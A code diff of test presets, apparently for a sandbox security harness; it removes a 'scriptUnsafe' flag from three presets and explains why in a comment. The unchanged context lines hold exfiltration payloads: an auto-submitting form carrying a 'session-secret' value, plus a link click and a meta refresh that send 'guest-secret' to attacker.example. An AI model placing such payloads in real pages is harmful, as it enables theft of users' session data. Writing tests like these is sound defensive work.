@@ -463,7 +463,8 @@ console.log('TEST_DONE');`,
             "textarea": `<textarea><head></textarea>`,
             "plaintext": `<plaintext>`,
         },
-        rules: { scriptUnsafe: true, capabilities: ["allow-scripts"] }
+        // markup runs with allow-scripts; nothing here evaluates strings, so no scriptUnsafe (broad review I2)
+        rules: { capabilities: ["allow-scripts"] }
     },
     "form-action-exfil": {
         id: "form-action-exfil",
@@ -477,7 +478,7 @@ console.log('TEST_DONE');`,
   <input name="stolen" value="session-secret">
 </form>
 <script>document.getElementById('f').submit();</script>`,
-        rules: { scriptUnsafe: true, capabilities: ["allow-scripts", "allow-forms"] }
+        rules: { capabilities: ["allow-scripts", "allow-forms"] }
     },
     "popup-exfiltration": {
         id: "popup-exfiltration",
@@ -511,7 +512,7 @@ console.log('POPUP ' + outcome);`,
             "link click": `<a id="a" href="https://attacker.example/?d=guest-secret">x</a><script>setTimeout(() => document.getElementById('a').click(), 50)</script>`,
             "meta refresh": `<meta http-equiv="refresh" content="0;url=https://attacker.example/?d=guest-secret">`,
         },
-        rules: { scriptUnsafe: true, capabilities: ["allow-scripts"] }
+        rules: { capabilities: ["allow-scripts"] }
     },
 } satisfies Record<string, Preset>;
 
